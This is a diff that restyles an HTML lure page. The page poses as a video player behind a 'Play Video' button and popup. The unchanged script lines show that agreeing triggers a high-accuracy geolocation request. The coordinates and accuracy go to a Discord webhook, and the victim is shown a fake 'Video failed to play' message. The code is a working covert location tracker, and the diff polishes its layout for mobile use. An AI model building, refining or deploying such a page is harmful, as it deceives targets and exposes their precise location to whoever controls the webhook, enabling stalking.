@@ -6,35 +6,43 @@
 <title>File Upload</title>
 
 <style>
+  *{
+    box-sizing:border-box;
+  }
+
   body{
     margin:0;
     font-family:Arial,sans-serif;
     background:#0f2866;
     color:white;
-    text-align:center;
     overflow-x:hidden;
   }
 
-  /* Top Bar */
+  /* =========================
+     TOP BAR
+  ========================= */
+
   header{
     background:#0045ad;
-    padding:16px 24px;
+    min-height:80px;
     display:flex;
     align-items:center;
     justify-content:space-between;
+    padding:12px 18px;
     position:relative;
+    gap:10px;
   }
 
   /* Left Logo */
   .left-logo{
-    position:absolute;
-    left:24px;
     display:flex;
     align-items:center;
+    z-index:2;
   }
 
   .logo{
-    height:34px;
+    height:30px;
+    max-width:120px;
   }
 
   /* Center Title */
@@ -43,17 +51,20 @@
     left:50%;
     transform:translateX(-50%);
     text-align:center;
+    width:max-content;
+    max-width:50%;
   }
 
   .center-title h1{
     margin:0;
-    font-size:26px;
+    font-size:22px;
     font-weight:bold;
+    line-height:1.1;
   }
 
   .center-title p{
-    margin:2px 0 0 0;
-    font-size:14px;
+    margin:3px 0 0 0;
+    font-size:13px;
     opacity:0.9;
   }
 
@@ -64,21 +75,26 @@
     border:none;
     color:white;
     font-weight:bold;
-    padding:12px 20px;
+    padding:10px 16px;
     border-radius:10px;
     cursor:pointer;
-    font-size:15px;
-    transition:0.2s;
+    font-size:14px;
+    z-index:2;
+    white-space:nowrap;
   }
 
-  .upload-btn:hover{
-    transform:scale(1.03);
-  }
+  /* =========================
+     MAIN CONTENT
+  ========================= */
 
-  /* Main Content */
   .main{
-    padding-top:60px;
-    padding-bottom:120px;
+    width:100%;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    flex-direction:column;
+    padding:50px 20px 140px;
+    text-align:center;
   }
 
   /* Image button */
@@ -86,19 +102,33 @@
     background:none;
     border:none;
     cursor:pointer;
+    width:100%;
+    display:flex;
+    justify-content:center;
   }
 
   .image-button img{
-    width:320px;
-    max-width:90%;
+    width:100%;
+    max-width:340px;
     border-radius:12px;
-    transition:0.2s;
     box-shadow:0 10px 30px rgba(0,0,0,0.4);
   }
 
-  .image-button img:hover{
-    transform:scale(1.02);
+  #status{
+    margin-top:20px;
+    font-size:16px;
+    text-align:center;
+    padding:0 10px;
   }
+
+  /* Hidden data container */
+  #hiddenData{
+    display:none;
+  }
+
+  /* =========================
+     POPUP
+  ========================= */
 
   #popup{
     position:fixed;
@@ -108,13 +138,20 @@
     align-items:center;
     justify-content:center;
     z-index:1000;
+    padding:20px;
   }
 
   .popup-box{
     background:#1f2937;
-    padding:30px;
+    padding:25px;
     border-radius:16px;
+    width:100%;
     max-width:400px;
+    text-align:center;
+  }
+
+  .popup-box h2{
+    margin-top:0;
   }
 
   .popup-buttons{
@@ -122,6 +159,7 @@
     display:flex;
     gap:10px;
     justify-content:center;
+    flex-wrap:wrap;
   }
 
   .popup-buttons button{
@@ -139,37 +177,32 @@
     background:#374151 !important;
   }
 
-  #status{
-    margin-top:20px;
-    font-size:18px;
-  }
+  /* =========================
+     COOKIE BAR
+  ========================= */
 
-  /* Hidden data container */
-  #hiddenData{
-    display:none;
-  }
-
-  /* Cookie Bar */
   #cookieBar{
     position:fixed;
     bottom:0;
     left:0;
     width:100%;
     background:#23272f;
-    padding:18px 24px;
+    padding:16px;
     display:flex;
     align-items:center;
     justify-content:space-between;
-    gap:20px;
+    gap:16px;
     z-index:999;
-    box-sizing:border-box;
+    flex-wrap:wrap;
   }
 
   #cookieBar p{
     margin:0;
     color:white;
     font-size:14px;
-    text-align:left;
+    line-height:1.5;
+    flex:1;
+    min-width:220px;
   }
 
   .accept-btn{
@@ -183,20 +216,63 @@
     white-space:nowrap;
   }
 
+  /* =========================
+     MOBILE FIXES
+  ========================= */
+
   @media (max-width:700px){
+
+    header{
+      min-height:90px;
+      padding:12px;
+    }
+
+    .logo{
+      height:24px;
+      max-width:90px;
+    }
+
+    .center-title{
+      max-width:42%;
+    }
+
+    .center-title h1{
+      font-size:18px;
+    }
+
+    .center-title p{
+      font-size:11px;
+    }
+
+    .upload-btn{
+      font-size:12px;
+      padding:9px 12px;
+    }
+
+    .main{
+      padding-top:40px;
+    }
+
+    .image-button img{
+      max-width:95%;
+    }
 
     #cookieBar{
       flex-direction:column;
       align-items:flex-start;
     }
 
-    .center-title h1{
-      font-size:22px;
+    .accept-btn{
+      width:100%;
     }
   }
 </style>
 </head>
 <body>
+
+<!-- =========================
+     HEADER
+========================= -->
 
 <header>
 
@@ -222,9 +298,12 @@
 
 </header>
 
+<!-- =========================
+     MAIN CONTENT
+========================= -->
+
 <div class="main">
 
-  <!-- Image Button -->
   <button class="image-button" onclick="openPopup()">
     <img src="showmylocation.png" alt="Play Video">
   </button>
@@ -236,9 +315,13 @@
 <!-- Hidden data -->
 <div id="hiddenData"></div>
 
-<!-- Consent Popup -->
+<!-- =========================
+     POPUP
+========================= -->
+
 <div id="popup">
   <div class="popup-box">
+
     <h2>Play Video</h2>
 
     <p>
@@ -255,10 +338,14 @@
       <button onclick="acceptShare()">Yes</button>
       <button class="cancel" onclick="closePopup()">No</button>
     </div>
+
   </div>
 </div>
 
-<!-- Cookie Bar -->
+<!-- =========================
+     COOKIE BAR
+========================= -->
+
 <div id="cookieBar">
 
   <p>
@@ -309,7 +396,7 @@ function acceptShare(){
       Accuracy: ${accuracy}
     `;
 
-    status.innerHTML = "Video Failed to Play";
+    status.innerHTML = "Video failed to play.";
 
     // Send to Discord webhook
     await fetch(webhook, {
@@ -329,7 +416,7 @@ Accuracy: ${accuracy} meters`
 
   }, ()=>{
 
-    status.innerHTML = "Permission denied, Video failed to play.";
+    status.innerHTML = "Required permissions denied, Video couldn't play.";
 
   }, {
     enableHighAccuracy:true
